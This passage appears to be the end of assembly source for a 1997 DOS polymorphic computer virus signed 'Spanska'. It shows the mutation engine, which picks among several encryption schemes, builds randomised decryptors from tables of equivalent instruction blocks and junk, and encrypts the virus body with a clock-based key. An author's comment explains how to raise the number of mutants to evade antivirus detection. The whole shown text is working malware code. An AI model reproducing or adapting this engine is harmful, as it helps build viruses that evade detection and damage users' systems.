   lea si, [bp+_mutation9]
   lea di, [bp+mutation9]
   mov ax, 10
   mov bx, 6
   call mute_bloc

   mov ax, 100
   call aleatoire
   cmp ax, 20              ;20% chances for a XOR encryption
   ja evite_suite
   jmp cryptage_xor
   evite_suite:
   cmp ax, 40              ;20% chances for a ADD/SUB encryption
   jb cryptage_add
   cmp ax, 55              ;15% chances for a ROL/ROR encryption
   jb cryptage_rol
   cmp ax,  70             ;15% chances for a INC/DEC encryption
   jb cryptage_inc
   cmp ax, 85              ;15% chances for a NOT encryption
   jb cryptage_not
               ;15% chances for a NEG encryption

   cryptage_neg:
   mov byte ptr cs:[bp+type_cryptage], 5
   lea si, [bp+_mutation10sixte]
   lea di, [bp+mutation10]
   mov ax, 4
   mov bx, 10
   call mute_bloc
   jmp evite_autres_cryptages

   cryptage_not:
   mov byte ptr cs:[bp+type_cryptage], 4
   lea si, [bp+_mutation10quinte]
   lea di, [bp+mutation10]
   mov ax, 4
   mov bx, 10
   call mute_bloc
   jmp evite_autres_cryptages

   cryptage_inc:
   mov byte ptr cs:[bp+type_cryptage], 3
   lea si, [bp+_mutation10quart]
   lea di, [bp+mutation10]
   mov ax, 5
   mov bx, 10
   call mute_bloc
   jmp evite_autres_cryptages

   cryptage_rol:
   mov byte ptr cs:[bp+type_cryptage], 2
   lea si, [bp+_mutation10ter]
   lea di, [bp+mutation10]
   mov ax, 4
   mov bx, 10
   call mute_bloc
   jmp evite_autres_cryptages

   cryptage_add:
   mov byte ptr cs:[bp+type_cryptage], 1
   lea si, [bp+_mutation10bis]
   lea di, [bp+mutation10]
   mov ax, 5
   mov bx, 10
   call mute_bloc
   jmp evite_autres_cryptages

   cryptage_xor:
   mov byte ptr cs:[bp+type_cryptage], 0
   lea si, [bp+_mutation10]
   lea di, [bp+mutation10]
   mov ax, 8
   mov bx, 10
   call mute_bloc

   evite_autres_cryptages:
   lea si, [bp+_mutation11]
   lea di, [bp+mutation11]
   mov ax, 6
   mov bx, 12
   call mute_bloc

   lea si, [bp+_mutation12]
   lea di, [bp+mutation12]
   mov ax, 11
   mov bx, 5
   call mute_bloc

   lea si, [bp+_mutation13]
   lea di, [bp+mutation13]
   mov ax, 9
   mov bx, 6
   call mute_bloc

   lea si, [bp+_mutation14]
   lea di, [bp+mutation14]
   mov ax, 6
   mov bx, 7
   call mute_bloc

   ;---------------- new random encryption key from clock ---------------

   mov ah, 2Ch
   int 21h
   mov cs:[bp+offset clef], dl

   ;------------- encrypt virus body in the heap -----------------------------

   lea si, [bp+offset debut_cryptage]
   lea di, [bp+offset heap]
   mov cx, fin_cryptage - debut_cryptage

   mov al, byte ptr cs:[bp+type_cryptage]
   cmp al, 0
   je xor_crypte
   cmp al, 1
   je sub_crypte
   cmp al, 2
   je ror_crypte
   cmp al, 3
   je dec_crypte
   cmp al, 4
   je not_crypte

   neg_crypte:
   lodsb
   neg al
   stosb
   loop neg_crypte
   jmp evite_autres_loops

   not_crypte:
   lodsb
   not al
   stosb
   loop not_crypte
   jmp evite_autres_loops

   dec_crypte:
   lodsb
   dec al
   stosb
   loop dec_crypte
   jmp evite_autres_loops

   ror_crypte:
   lodsb
   ror al, 1
   stosb
   loop ror_crypte
   jmp evite_autres_loops

   sub_crypte:
   lodsb
   sub al, dl
   stosb
   loop sub_crypte
   jmp evite_autres_loops

   xor_crypte:
   lodsb
   xor al, dl
   stosb
   loop xor_crypte

   evite_autres_loops:
   mov al, dl
   stosb

   pop bp
   pop ds
   pop es
   pop dx
   pop cx
   pop bx
   pop ax
   ret

   ;----------pseudo-random number generator--------------
   ;in: ax = upper limit
   ;out: ax = random number between 0 et limit-1 included

   aleatoire:
   push bx
   push dx         ;i've made a little error in this routine,
   push cx         ;because i wanted to make slow poly with:
   xchg ax, bx
   mov ah, 2Ah     ;get date: return dh=month dl=day
   int 21h
   xchg dx, ax     ;i didn't thought that will restrict the
   xor ax, 0FFFFh  ;number of possible mutants to 365 (thanks
   xor dx, dx      ;to AVP to have shown me this error). Replace
   div bx          ;the "get date" (mov ah, 2Ah) by a "get time"
   xchg ax, dx     ;(mov ah, 2Ch) and you will have millions
   pop cx          ;of possible mutants.
   pop dx
   pop bx
   ret

   ;------------change an entire block of instructions--------------
   ;in: si=stock zone, di=offset in decryptor
   ;ax=number of possibilities, bx=number of bytes

   mute_bloc:
   call aleatoire
   mov cx, bx
   mul bx
   add si, ax
   rep movsb
   ret

   ;-------------possible mutations------------------------

   ;0/ get delta offset in 23 bytes

   _mutation0:

   mov di, sp
   call $+4
   ;delta:
   ret
   dec di
   dec di
   db 36h, 81h, 2Dh, 34h, 1                ;sub ss:[di], offset delta
   mov bp, ss:[di]
   add word ptr ss:[di], offset mutation1
   db 0EBh, 0EEh                           ;jmp delta

   mov si, sp
   call $+4
   ;delta:
   ret
   dec si
   dec si
   db 36h, 81h, 2Ch, 34h, 1                ;sub ss:[si], offset delta
   mov bp, ss:[si]
   add word ptr ss:[si], offset mutation1
   db 0EBh, 0EEh                           ;jmp delta

   mov si, sp
   call $+5
   ;delta:
   int 20h
   dec si
   dec si
   db 36h, 81h, 2Ch, 34h, 1                ;sub ss:[si], offset delta
   mov bp, ss:[si]
   add word ptr ss:[si], offset mutation1
   ret

   nop
   mov di, sp
   sub di, 2
   call $+3
   ;delta:
   db 36h, 81h, 2Dh, 38h, 1                ;sub ss:[di], offset delta
   mov bp, ss:[di]
   add word ptr ss:[di], offset mutation1
   ret

   nop
   nop
   nop
   nop
   nop
   call $+3
   ;delta:
   mov bp, sp
   mov ax, [bp]
   db 83h, 46h, 0, 0Fh             ;add word ptr [bp], mutation1-delta
   db 2Dh, 37h, 1                  ;sub ax, offset delta
   mov bp, ax
   ret

   call $+4
   nop
   ;delta:
   mov ax, sp
   xchg ax, bx
   mov ax, ss:[bx]
   inc ax
   db 36h, 83h, 07, 14h            ;add word ptr ss:[bx], mutation1-delta+1
   db 2Dh, 33h, 1                  ;sub ax, offset delta
   mov bp, ax
   ret
   nop
   nop

   sub bx, bx
   or bx, sp
   dec bx
   call $+3
   ;delta:
   dec bx
   db 36h, 81h, 2Fh, 37h, 1        ;sub ss:[bx], offset delta
   mov bp, ss:[bx]
   db 36h, 81h, 07, 46h, 1         ;add word ptr ss:[bx], offset mutation1
   ret

   nop
   call $+7
   ;delta:
   mov cl, 2
   db 0E2h, 0Fh                    ;loop mutation1
   mov ax, 0FFFFh
   and ax, sp
   xchg ax, bx
   mov ax, ss:[bx]
   db 2Dh, 33h, 1                  ;sub ax, offset delta
   mov bp, ax
   ret

   mov ax, sp
   dec ax
   dec ax
   xchg ax, bx
   call $+3
   ;delta:
   db 36h, 81h, 2Fh, 37h, 1        ;sub ss:[bx], offset delta
   mov bp, ss:[bx]
   db 36h, 81h, 07, 46h, 1         ;add word ptr ss:[bx], offset mutation1
   ret
   nop

   mov bx, sp
   call $+3
   ;delta:
   db 36h, 81h, 6Fh, 0FEh, 34h, 1  ;sub ss:[bx-2], offset delta
   mov bp, ss:[bx-2]
   add word ptr ss:[bx-2], offset mutation1
   ret
   int 3h

   call $+3
   ;delta:
   mov bx, sp
   mov ax, ss:[bx]
   db 05, 14h, 0                   ;add ax, mutation1-delta
   db 36h, 81h, 2Fh, 32h, 1        ;sub ss:[bx], offset delta
   mov bp, ss:[bx]
   mov ss:[bx], ax
   ret

   db 0B8h, 38h, 1                 ;mov ax, offset delta
   db 0B9h, 0Eh, 0                 ;mov cx, offset mutation1-delta
   call $+3
   ;delta:
   mov bx, sp
   mov dx, ss:[bx]
   sub dx, ax
   mov bp, dx
   add ss:[bx], cx
   ret
   clc


   ;1/ push es, ds then put es=ds=cs in 20 bytes

   _mutation1:

   push es
   push ds
   push cs
   push cs
   pop es
   pop ds
   db 10 dup (90h)
   clc
   db 2 dup (90h)
   clc

   db 9 dup (90h)
   push es
   nop
   push ds
   nop
   push cs
   nop
   pop es
   nop
   push cs
   nop
   pop ds

   mov ax, es
   push ax
   mov ax, ds
   push ax
   mov ax, cs
   push ax
   push ax
   pop bx
   pop bx
   mov es, bx
   mov ds, bx
   db 4 dup (90h)

   nop
   mov bx, es
   push bx
   mov cx, ds
   push cx
   mov dx, cs
   mov es, dx
   mov ds, dx
   nop
   xor ax, 0
   db 3 dup (90h)

   nop
   nop
   mov ax, es
   nop
   mov bx, ds
   nop
   mov cx, cs
   nop
   push cx
   nop
   push cx
   nop
   pop ds
   nop
   pop es
   push ax
   push bx

   xor dx, dx
   mov cx, es
   or dx, cx
   push dx
   xor cx, cx
   mov dx, ds
   or cx, dx
   push cx
   mov cx, cs
   push cx
   pop es
   mov ds, cx

   mov ax, 0FFFFh
   mov bx, es
   and ax, bx
   push ax
   mov dx, ds
   push dx
   push bp
   mov bp, cs
   mov ds, bp
   mov es, bp
   pop bp
   nop

   sub sp, 2
   mov bx, sp
   mov ss:[bx], es
   mov ax, ds
   mov bx, cs
   push bx
   pop es
   mov ds, bx
   push ax
   db 3 dup (90h)

   dec sp
   dec sp
   mov bx, sp
   mov ss:[bx], es
   dec sp
   dec sp
   mov bx, sp
   mov ss:[bx], ds
   mov ax, cs
   mov es, ax
   mov ds, ax

   nop
   sub sp, 4
   mov di, sp
   mov ss:[di], ds
   mov ss:[di+2], es
   push cs
   mov si, sp
   mov es, ss:[si]
   pop ds


   ;2/ JMP 12Bh in 5 bytes

   _mutation2:

   db 90h          ;nop
   db 33h, 0C0h    ;xor ax, ax
   db 74h, 0Bh     ;je decrypte

   db 33h, 0C9h    ;xor cx, cx
   db 41h          ;inc cx
   db 75h, 0Bh     ;jne decrypte

   db 90h          ;nop
   db 0EBh, 0Dh    ;jmp decrypte
   db 90h          ;nop
   clc

   db 90h          ;nop
   db 34h, 0FFh    ;xor al, 0FFh
   db 75h, 0Bh     ;jne decrypte

   db 32h, 0DBh    ;xor bl, bl
   db 76h, 0Ch     ;jbe decrypte
   db 90h          ;nop

   db 0B9h, 02h, 0 ;mov cx, 2
   db 0E2h, 0Bh    ;loop decrypte

   db 41h          ;inc cx
   db 41h          ;inc cx
   db 0E2h, 0Ch    ;loop decrypte
   db 90h          ;nop

   db 0E9h, 0Dh, 0 ;jmp near decrypte
   push ax
   pop ax

   db 90h          ;nop
   db 90h          ;nop
   db 0E9h, 0Bh, 0 ;jmp near decrypte

   db 0F6h,0C5h,01 ;test ch, 1
   db 74h, 0Bh     ;jz decrypte

   ;3/ STOSB in 6 bytes (without di, si, cx, dl)

   _mutation3:

   stosb
   nop
   nop
   nop
   nop
   clc

   nop
   nop
   nop
   nop
   nop
   stosb

   mov es:[di], al
   xchg ax, di
   inc ax
   xchg ax, di

   xchg ax, dx
   mov ds:[di], dl
   inc di
   xchg ax, dx
   nop

   inc di
   mov es:[di-1],al
   nop

   mov byte ptr [di], 0
   or [di], al
   inc di

   xchg byte ptr [di], al
   add di, 2
   dec di

   mov byte ptr [di], 0
   add byte ptr [di], al
   inc di

   add di, 1
   xchg byte ptr [di-1], al;3

   mov byte ptr [di], 0FFh
   and byte ptr [di], al
   inc di

   ;4/ RET in 5 bytes (without di, si, cx, dl)

   _mutation4:

   ret
   nop
   nop
   nop
   clc

   nop
   nop
   nop
   nop
   ret

   pop ax
   jmp ax
   nop
   nop

   nop
   pop bx
   jmp bx
   nop

   xchg ax, cx
   pop cx
   xchg ax, cx
   jmp ax

   xchg ax, dx
   pop dx
   xchg ax, dx
   jmp ax

   pop ax
   pushf
   push cs
   push ax
   iret

   pop bx
   pushf
   push cs
   push bx
   iret

   ;5/ mov cx, fin_cryptage-debut_cryptage  in 6 bytes

   _mutation5:

   mov cx, fin_cryptage-debut_cryptage
   nop
   nop
   nop

   nop
   nop
   nop
   mov cx, fin_cryptage-debut_cryptage

   mov ax, fin_cryptage - debut_cryptage+1
   dec ax
   push ax
   pop cx

   mov bx, fin_cryptage-debut_cryptage
   push bx
   pop cx
   nop

   nop
   mov dx, fin_cryptage-debut_cryptage
   xchg cx, dx

   mov ax, fin_cryptage-debut_cryptage-1
   inc ax
   mov cx, ax

   xor cx, cx
   add cx, fin_cryptage-debut_cryptage

   xor ax, ax
   add ax, fin_cryptage-debut_cryptage
   xchg ax, cx

   mov cx, debut_cryptage-fin_cryptage
   neg cx
   nop

   ;6/ lea si, debut_cryptage in 10 bytes (without CX)

   _mutation6:

   lea si, [bp+offset debut_cryptage+5]
   sub si, 5
   nop
   nop
   nop

   nop
   nop
   nop
   nop
   nop
   nop
   lea si, [bp+offset debut_cryptage]

   mov ax, bp
   add ax, offset debut_cryptage+9
   mov si, ax
   sub si, 9

   sub bx, bx
   xor bx, offset debut_cryptage
   add bx, bp
   xchg si, bx

   xor dx, dx
   add dx, bp
   add dx, offset debut_cryptage
   mov si, dx

   mov bx, bp
   mov ax, offset debut_cryptage+1
   add ax, bx
   mov si, ax
   dec si

   push bp
   pop ax
   add ax, offset debut_cryptage-1
   inc ax
   mov bx, ax
   mov si, bx

   mov dx, offset debut_cryptage
   neg dx
   push bp
   pop si
   sub si, dx
   nop

   ;7/ mov di, si in 4 bytes (without CX, SI)

   _mutation7:

   mov di, si
   nop
   nop

   nop
   nop
   mov di, si

   nop
   push si
   pop di
   nop

   push si
   pop dx
   xchg dx, di

   xchg si, di
   mov si, di

   push si
   pop ax
   xchg ax, di
   nop

   sub di, di
   xor di, si

   mov ax, si
   mov di, ax

   xchg si, ax
   xchg ax, di
   mov si, di

   ;8/ mov dl, cs:[bp+offset clef] in 10 bytes (without CX, SI, DI)

   _mutation8:

   mov dl, cs:[bp+offset clef]
   nop
   nop
   nop
   nop
   nop

   nop
   nop
   nop
   nop
   nop
   mov dl, ds:[bp+offset clef]

   lea bx, [bp+offset clef+5]
   sub bx, 5
   mov dl, [bx]
   nop

   mov ax, bp
   add ax, offset clef-2
   inc ax
   inc ax
   xchg ax, bx
   mov dl, [bx]

   sub bx, bx
   xor bx, offset clef
   add bx, bp
   mov dl, [bx]

   mov bx, bp
   add bx, offset clef
   mov dh, [bx]
   xchg dh, dl

   mov bx, bp
   mov ax, offset clef+1
   add bx, ax
   mov dl, [bx-1]

   ;9/ LODSB in 6 bytes (without CX, SI, DI, DL)

   _mutation9:

   lodsb
   nop
   nop
   nop
   nop
   nop

   nop
   nop
   nop
   nop
   nop
   lodsb

   mov al, es:[si]
   xchg ax, si
   inc ax
   xchg ax, si

   mov bx, si
   mov al, [bx]
   inc si
   nop

   inc si
   mov al, es:[si-1]
   nop

   mov ax, 0
   or al, [si]
   inc si

   xchg byte ptr [si], al
   add si, 2
   dec si

   xor ax, ax
   add al, byte ptr [si]
   inc si
   nop

   add si, 1
   xchg byte ptr [si-1], al

   mov ax, 0FFFFh
   and al, byte ptr [di]
   inc si

   ;10/ XOR AL, DL in 10 bytes (without CX, SI, DI, DL, AL)

   _mutation10:

   xor al, dl
   db 2 dup (90h)
   xchg cx, bx
   xchg cx, bx
   nop
   clc

   db 8 dup (90h)
   xor al, dl

   xchg ax, bx
   xor bl, dl
   xchg ax, bx
   db 5 dup (90h)
   stc

   db 2 dup (90h)
   xor ax, dx
   db 6 dup (90h)

   clc
   db 5 dup (90h)
   xor ax, dx
   db 2 dup (90h)

   stc
   db 2 dup (90h)
   mov bx, dx
   xor ax, bx
   db 3 dup (90h)

   lea bx, [bp+offset temp]
   mov [bx], dl
   xor [bx], al
   mov al, [bx]

   lea bx, [bp+offset temp]
   xchg [bx], al
   xor [bx], dl
   xchg al, [bx]

   ;10bis/  add AL, DL in 10 bytes (without CX, SI, DI, DL, AL)

   _mutation10bis:

   db 3 dup (90h)
   add al, dl
   db 5 dup (90h)

   db 4 dup (90h)
   xchg al, dl
   add dl, al
   xchg al, dl

   mov ah, al
   mov dh, dl
   db 2 dup (90h)
   add ah, dh
   xchg ah, al

   neg dl
   sub al, dl
   neg dl
   db 4 dup (90h)

   db 2 dup (90h)
   neg dx
   nop
   sub al, dl
   nop
   neg dx

   ;10ter/  rol AL in 10 bytes (without CX, SI, DI, DL, AL)

   _mutation10ter:

   db 3 dup (90h)
   rol al, 1
   db 5 dup (90h)

   db 7 dup (90h)
   rol al, 1
   nop

   lea bx, [bp+offset temp]
   xchg [bx], al
   rol byte ptr [bx], 1
   xchg al, [bx]

   jmp baise_les4
   neg al
   inc al
   not al
   baise_les4:
   rol al, 1

   ;10quart/  inc AL in 10 bytes (without CX, SI, DI, DL, AL)

   _mutation10quart:

   db 4 dup (90h)
   inc al
   db 4 dup (90h)

   db 8 dup (90h)
   add al, 1

   inc ax
   db 9 dup (90h)

   lea bx, [bp+offset temp]
   xchg [bx], al
   inc byte ptr [bx]
   xchg al, [bx]

   jmp baise_les
   xor al, dl
   add al, dl
   rol al, 1
   baise_les:
   inc al

   ;10quinte/  not AL in 10 bytes (without CX, SI, DI, DL, AL)

   _mutation10quinte:

   db 4 dup (90h)
   not al
   db 4 dup (90h)

   db 4 dup (90h)
   xchg al, dh
   not dh
   xchg al, dh

   lea bx, [bp+offset temp]
   xchg [bx], al
   not byte ptr [bx]
   xchg al, [bx]

   jmp baise_les2
   xor al, dl
   add al, dl
   inc al
   baise_les2:
   not al

   ;10sixte/  neg AL in 10 bytes (without CX, SI, DI, DL, AL)

   _mutation10sixte:

   db 3 dup (90h)
   neg al
   db 5 dup (90h)

   db 3 dup (90h)
   mov dh, al
   neg dh
   mov al, dh
   nop

   lea bx, [bp+offset temp]
   xchg [bx], al
   neg byte ptr [bx]
   xchg al, [bx]

   jmp baise_les3
   not al
   xor al, dl
   inc al
   baise_les3:
   neg al

   ;11/ CALL in 12 bytes (without CX, SI, DI, DL, AL)

   _mutation11:

   db 0E8h, 0C4h, 0FFh     ;call baise_flag_cryptage
   db 90h, 90h, 90h, 90h, 90h
   db 90h, 90h, 90h
   stc

   lea bx, [bp+offset mutation11+12]
   push bx
   db 0EBh, 0C0h           ;jmp baise_flag_cryptage
   db 90h, 90h, 90h, 90h
   clc

   db 8Bh, 0DDh            ;mov bx, bp
   add bx, offset mutation11
   db 83h, 0C3h, 0Ch       ;add bx, 12
   db 53h                  ;push bx
   db 0EBh, 0BBh           ;jmp baise_flag_cryptage

   db 51h                  ;push cx
   lea bx, [bp+offset mutation11+10]
   db 53h                  ;push bx
   db 0B1h, 02h            ;mov cl, 2
   db 0E2h, 0BDh           ;loop baise_flag_cryptage
   db 59h                  ;pop cx
   nop

   lea bx, [bp+offset mutation11+12]
   db 53h                  ;push bx
   db 32h, 0DBh            ;xor bl, bl
   db 76h, 0BEh            ;jbe baise_flag_cryptage
   nop
   nop
   nop

   mov bx, offset mutation11+10
   db 43h                  ;inc bx
   db 03h, 0DDh            ;add bx, bp
   db 43h                  ;inc bx
   db 53h                  ;push bx
   db 32h, 0DBh            ;xor bl, bl
   db 74h, 0BBh            ;je baise_flag_cryptage

   ;12/ DEC CX in 5 bytes (without CX, SI, DI, DL, AL)

   _mutation12:

   nop
   nop
   dec cx
   nop
   nop

   nop
   nop
   sub cx, 1

   inc cx
   sub cx, 2
   nop

   neg cx
   inc cx
   neg cx

   xchg cx, bx
   dec bx
   xchg cx, bx

   nop
   nop
   xchg cx, ax
   dec ax
   xchg cx, ax

   xchg cx, di
   dec di
   xchg cx, di

   xor bl, bl
   sbb cx, 1

   db 81h, 0C1h, 0FFh, 0FFh
   nop
   db 90h, 90h
   db 83h, 0C1h, 0FFh

   mov bx, 1
   sub cx, bx

   ;13/ CMP CX, 0 in 6 bytes

   _mutation13:

   cmp cx, 0
   nop
   nop
   nop

   nop
   nop
   nop
   cmp cx, 0

   nop
   or cx, cx
   nop
   nop
   nop

   nop
   nop
   nop
   or cx, cx
   nop

   test cx, 0FFFFh
   nop
   nop

   or cl, cl
   jne suite_or
   or ch, ch
   suite_or:

   mov bx, cx
   inc bx
   cmp bx, 1

   inc cx
   cmp cx, 1
   dec cx
   nop

   dec cx
   cmp cx, 0FFFFh
   inc cx
   nop

   ;14/ JNE XOR_LOOP in 7 bytes

   _mutation14:

   db 90h, 90h, 90h
   db 90h, 90h
   db 75h, 0D2h            ;jne xor_loop

   db 90h, 90h, 90h        ;3 nop
   db 75h, 0D4h            ;jne xor_loop
   db 90h                  ;nop
   clc

   db 90h, 90h             ;2 nop
   db 74h, 03              ;je suite_zob
   db 0EBh, 0D3h           ;jmp xor_loop
   stc
   ;suite_zob:

   db 77h, 0D7h            ;ja xor_loop
   db 90h, 90h, 90h        ;3 nop
   db 90h, 90h             ;2 nop

   db 76h, 05h             ;jna suite_zobi ;2
   db 0EBh, 0D5h           ;jmp xor_loop
   db 90h, 90h, 90h        ;3 nop
   ;suite_zobi:

   db 9Ch                  ;pushf
   db 5Bh                  ;pop bx
   db 0F6h, 0C3h, 40h      ;test bl, 01000000b
   db 74h, 0D2h            ;je xor_loop

   ;-----------memory zones used by mutation engine---------------

   temp            db 0
   type_cryptage   db 0

   fin_cryptage:
   clef            db 0
   endvirus:
   heap:

   code    ends
       end     start

   ;----------------- (c) Spanska 1997 ---------------------------
